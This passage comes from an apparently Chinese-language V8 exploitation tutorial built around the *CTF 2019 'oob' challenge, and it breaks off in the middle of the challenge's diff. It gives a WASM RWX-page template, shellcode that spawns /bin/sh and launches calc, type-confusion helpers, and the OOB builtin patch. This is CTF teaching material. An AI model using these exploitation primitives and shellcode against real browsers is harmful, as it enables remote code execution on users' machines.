class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_mod);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line">0x0d1dfcf5f929 &lt;JSFunction 0 (sfi = 0xd1dfcf5f8f1)&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x0d1dfcf5f929</span><br><span class="line">0xd1dfcf5f929: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f44379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0d1dfcf42109 &lt;JSFunction (sfi = 0xe9259bc3b29)&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x0d1dfcf5f8f1 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0xd1dfcf5f731</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0e9259bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x0e9259bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x0e9259bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x0e9259bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见此时内存已经出现了拥有 <code>rwx</code> 权限的区域</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">0xfb58ac2e000      0xfb58ac2f000 rwxp     1000      0 [anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>现在的问题是我们要如何获取到这个内存区域的地址，我们来查看一下 <code>f</code> 的 <code>shared_info</code> 结构的信息：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下里再查看其 <code>data</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>再查看 <code>instance</code> 结构：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>仔细查看能发现，<code>instance</code> 结构就是 <code>js</code> 代码中的 <code>wasm_mod</code> 变量的地址<br>我们再来查看这个结构的内存布局：  </p><img src="/2024/05/05/v8start/7.png" class="" title="我的图图呢">  <p>仔细看，能发现，<code>rwx</code> 段的起始地址储存在 <code>instance+0x88</code> 的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写 <code>exp</code> 的时候通过上述调试的方式进行查找。<br>根据 WASM 的特性，我们的目的可以更细化了，现在我们的目的变为了把 <code>shellcode</code> 写到 <code>WASM</code> 的代码段，然后执行 <code>WASM</code> 函数，那么就能执行 <code>shellcode</code> 了。<br>这里可以写成一个固定的模板：   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>其中 <code>arbitrary_address_read</code> 函数的具体实现方式要看具体的漏洞环境  </p><h3 id="常用shellcode"><a href="#常用shellcode" class="headerlink" title="常用shellcode"></a>常用shellcode</h3><p>在 <code>CTF</code> 题目中，我们的目的大多数是 <code>getshell</code> 然后获取 <code>flag</code>，用于 <code>getshell</code> 的 <code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当然我们也可以令其弹计算器，<code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="类型混淆利用模板"><a href="#类型混淆利用模板" class="headerlink" title="类型混淆利用模板"></a>类型混淆利用模板</h3><p>这里先给出一些方便类型混淆漏洞利用的模板，在后面编写 <code>exp</code> 时会用上  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>和文章一开始说的一样，环境用的是 <code>*CTF 2019</code> 的 <code>oob</code>。题目给了一个 <code>diff</code> 文件：  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case 